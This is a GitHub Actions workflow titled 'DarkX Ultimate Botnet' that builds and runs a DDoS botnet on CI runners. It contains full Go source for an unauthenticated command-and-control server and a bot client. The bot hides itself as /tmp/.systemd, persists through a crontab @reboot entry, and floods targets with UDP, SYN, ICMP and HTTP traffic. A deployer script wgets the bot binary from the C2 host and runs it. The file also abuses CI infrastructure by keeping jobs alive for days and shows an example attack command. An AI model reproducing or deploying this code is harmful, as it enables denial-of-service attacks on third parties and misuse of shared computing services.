name: DarkX Ultimate Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'

jobs:
  deploy-darkx-ultimate:
    runs-on: ubuntu-latest
    timeout-minutes: 4320

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Ultimate Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing ultimate dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
        sudo apt install -y nmap masscan hydra john netcat-openbsd
        sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
        pip3 install requests paramiko scapy cryptography colorama

    - name: Install Tailscale
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
        echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Create Fixed CNC Server
      run: |
        cd darkx
        cat > cnc_server.go << 'EOF'
        package main
        
        import (
            "bufio"
            "fmt"
            "net"
            "strings"
            "sync"
        )
        
        type Bot struct {
            Conn net.Conn
            IP   string
        }
        
        var (
            bots     []Bot
            botMutex sync.Mutex
        )
        
        func main() {
            fmt.Println("DarkX Ultimate CNC - NO AUTH - READY")
            port := "5555"
            listener, err := net.Listen("tcp", ":"+port)
            if err != nil {
                fmt.Printf("Failed to start CNC: %v\n", err)
                return
            }
            fmt.Printf("CNC Listening on :%s\n", port)
            
            for {
                conn, err := listener.Accept()
                if err != nil {
                    continue
                }
                go handleConnection(conn)
            }
        }
        
        func handleConnection(conn net.Conn) {
            defer conn.Close()
            reader := bufio.NewReader(conn)
            
            // Add bot
            bot := Bot{
                Conn: conn,
                IP:   strings.Split(conn.RemoteAddr().String(), ":")[0],
            }
            
            botMutex.Lock()
            bots = append(bots, bot)
            botCount := len(bots)
            botMutex.Unlock()
            
            fmt.Printf("New bot: %s (Total: %d)\n", bot.IP, botCount)
            conn.Write([]byte(fmt.Sprintf("Connected to DarkX CNC. Bots: %d\n", botCount)))
            
            // Handle commands from user
            for {
                conn.Write([]byte("darkx> "))
                cmd, err := reader.ReadString('\n')
                if err != nil {
                    break
                }
                cmd = strings.TrimSpace(cmd)
                
                if cmd == "bots" {
                    botMutex.Lock()
                    conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n", len(bots))))
                    botMutex.Unlock()
                } else if strings.HasPrefix(cmd, "attack") {
                    parts := strings.Split(cmd, " ")
                    if len(parts) >= 4 {
                        target := parts[1]
                        port := parts[2]
                        duration := parts[3]
                        
                        botMutex.Lock()
                        attackCount := len(bots)
                        for _, bot := range bots {
                            bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s\n", target, port, duration)))
                        }
                        botMutex.Unlock()
                        conn.Write([]byte(fmt.Sprintf("Attack launched on %s:%s with %d bots\n", target, port, attackCount)))
                    } else {
                        conn.Write([]byte("Usage: attack <target> <port> <duration>\n"))
                    }
                } else if cmd == "help" {
                    conn.Write([]byte("Commands: bots, attack <target> <port> <duration>, help, exit\n"))
                } else if cmd == "exit" {
                    conn.Write([]byte("Goodbye!\n"))
                    return
                } else {
                    conn.Write([]byte("Unknown command. Type 'help' for help.\n"))
                }
            }
            
            // Remove disconnected bot
            botMutex.Lock()
            for i, b := range bots {
                if b.Conn == conn {
                    bots = append(bots[:i], bots[i+1:]...)
                    break
                }
            }
            botMutex.Unlock()
            fmt.Printf("Bot disconnected: %s\n", bot.IP)
        }
        EOF

    - name: Create Bot Client
      run: |
        cd darkx
        cat > bot_client.go << 'EOF'
        package main
        
        import (
            "bufio"
            "fmt"
            "net"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "time"
        )
        
        var (
            CNC_SERVER = "CNC_IP_PLACEHOLDER"
            CNC_PORT   = "5555"
        )
        
        func main() {
            if runtime.GOOS == "linux" {
                exec.Command("sh", "-c", "cp /proc/self/exe /tmp/.systemd && chmod +x /tmp/.systemd").Run()
                exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -").Run()
            }
            
            for {
                if connectToCNC() {
                    time.Sleep(30 * time.Second)
                } else {
                    time.Sleep(60 * time.Second)
                }
            }
        }
        
        func connectToCNC() bool {
            conn, err := net.Dial("tcp", CNC_SERVER+":"+CNC_PORT)
            if err != nil {
                return false
            }
            defer conn.Close()
            
            conn.Write([]byte("BOT_CONNECTED\n"))
            
            scanner := bufio.NewScanner(conn)
            for scanner.Scan() {
                line := scanner.Text()
                
                if strings.HasPrefix(line, "ATTACK") {
                    parts := strings.Split(line, " ")
                    if len(parts) >= 4 {
                        target := parts[1]
                        port := parts[2]
                        duration := parts[3]
                        go executeAttack(target, port, duration)
                    }
                }
            }
            return true
        }
        
        func executeAttack(target, port, duration string) {
            fmt.Printf("Attacking %s:%s for %s\n", target, port, duration)
            
            go launchUDPFlood(target, port, duration)
            go launchSYNFlood(target, port, duration)
            go launchHTTPFlood(target, port, duration)
            go launchICMPFlood(target, duration)
        }
        
        func launchUDPFlood(target, port, duration string) {
            cmd := exec.Command("timeout", duration, "hping3", "--udp", "-p", port, "--flood", target)
            cmd.Start()
        }
        
        func launchSYNFlood(target, port, duration string) {
            cmd := exec.Command("timeout", duration, "hping3", "--syn", "-p", port, "--flood", target)
            cmd.Start()
        }
        
        func launchHTTPFlood(target, port, duration string) {
            go func() {
                endTime := time.Now().Add(parseDuration(duration))
                for time.Now().Before(endTime) {
                    exec.Command("curl", "-s", fmt.Sprintf("http://%s:%s", target, port)).Run()
                    time.Sleep(100 * time.Millisecond)
                }
            }()
        }
        
        func launchICMPFlood(target, duration string) {
            cmd := exec.Command("timeout", duration, "hping3", "--icmp", "--flood", target)
            cmd.Start()
        }
        
        func parseDuration(dur string) time.Duration {
            if strings.HasSuffix(dur, "s") {
                sec, _ := strconv.Atoi(strings.TrimSuffix(dur, "s"))
                return time.Duration(sec) * time.Second
            } else if strings.HasSuffix(dur, "m") {
                min, _ := strconv.Atoi(strings.TrimSuffix(dur, "m"))
                return time.Duration(min) * time.Minute
            }
            return 60 * time.Second
        }
        EOF

    - name: Build Components
      run: |
        cd darkx
        echo "Building DarkX components..."
        go build -o cnc cnc_server.go
        echo "CNC built successfully"
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.CNC_IP }}/g" bot_client.go
        go build -o bot bot_client.go
        echo "Bot client built successfully"
        echo "All components built successfully"

    - name: Deploy Initial Botnet
      run: |
        cd darkx
        echo "Starting CNC server..."
        nohup ./cnc > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        
        echo "Deploying initial bots..."
        for i in {1..500}; do
          nohup ./bot >/dev/null 2>&1 &
        done
        echo "Initial bots deployed"
        sleep 5

    - name: Start File Server
      run: |
        cd darkx
        python3 -m http.server 8000 > http.log 2>&1 &
        echo "HTTP_PID=$!" >> $GITHUB_ENV
        sleep 3

    - name: Create Bot Deployer
      run: |
        cd darkx
        cat > deploy_bots.sh << 'EOF'
        #!/bin/bash
        CNC_IP="${{ env.CNC_IP }}"
        deploy_bot() {
            wget -q http://$CNC_IP:8000/bot -O /tmp/.systemd
            chmod +x /tmp/.systemd
            nohup /tmp/.systemd >/dev/null 2>&1 &
            (crontab -l 2>/dev/null; echo "@reboot /tmp/.systemd") | crontab -
        }
        case "${{ github.event.inputs.power }}" in
            "100mb") COUNT=2000 ;;
            "1gb") COUNT=10000 ;;
            "10gb") COUNT=40000 ;;
            "100gb") COUNT=100000 ;;
            "1tb") COUNT=200000 ;;
        esac
        echo "Deploying $COUNT bots..."
        for i in $(seq 1 $COUNT); do
            deploy_bot &
            if [ $((i % 500)) -eq 0 ]; then
                sleep 2
                echo "Deployed $i/$COUNT bots"
            fi
        done
        wait
        echo "All $COUNT bots deployed"
        EOF
        chmod +x deploy_bots.sh

    - name: Mass Deploy Bots
      run: |
        cd darkx
        echo "Starting massive bot deployment..."
        nohup ./deploy_bots.sh > deployment.log 2>&1 &
        echo "DEPLOY_PID=$!" >> $GITHUB_ENV
        sleep 10
        for i in {1..10}; do
            if ps -p $DEPLOY_PID > /dev/null 2>&1; then
                CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
                echo "Connected: $CONNECTED_BOTS"
                sleep 10
            else
                break
            fi
        done

    - name: Display Dashboard
      run: |
        echo ""
        echo "=========================================="
        echo "        DARKX ULTIMATE BOTNET"
        echo "=========================================="
        echo "NO AUTHENTICATION REQUIRED"
        echo "Power Level:    ${{ github.event.inputs.power }}"
        echo "Recruitment:    ${{ github.event.inputs.recruitment }}"
        echo "DarkX CNC:      ${{ env.CNC_IP }}:5555"
        echo "Bot Deployment: ACTIVE"
        echo "Target Power:   400+ Gbps"
        echo "=========================================="
        echo "Connect: nc ${{ env.CNC_IP }} 5555"
        echo "Commands:"
        echo "  bots - Show connected bots"
        echo "  attack <target> <port> <duration>"
        echo "  help - Show commands"
        echo "  exit - Disconnect"
        echo ""
        echo "Example: attack 1.1.1.1 80 60s"
        echo "=========================================="
        echo ""

    - name: Maintain Botnet
      run: |
        echo "DarkX Ultimate Active - Maintaining Botnet"
        WORKSPACE="$GITHUB_WORKSPACE"
        DARKX_DIR="$WORKSPACE/darkx"
        
        cd "$DARKX_DIR"
        nohup bash -c 'while true; do for i in {1..500}; do nohup ./bot >/dev/null 2>&1 & done; sleep 60; done' > continuous_bots.log 2>&1 &
        
        while true; do
          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
          TOTAL_PROCESSES=$(ps aux | grep bot | grep -v grep | wc -l)
          CNC_PROCESSES=$(ps aux | grep cnc | grep -v grep | wc -l)
          ESTIMATED_POWER=$((CONNECTED_BOTS * 500))
          
          echo "[$(date +'%H:%M:%S')] Stats:"
          echo "  Connected Bots: $CONNECTED_BOTS"
          echo "  Total Processes: $TOTAL_PROCESSES"
          echo "  Estimated Power: $ESTIMATED_POWER Mbps"
          echo "  CNC Processes: $CNC_PROCESSES"
          echo "  System Status: STABLE"
          
          if [ $CNC_PROCESSES -eq 0 ]; then
            echo "Restarting CNC..."
            cd "$DARKX_DIR"
            nohup ./cnc > cnc_restart.log 2>&1 &
          fi
          
          sleep 30
        done
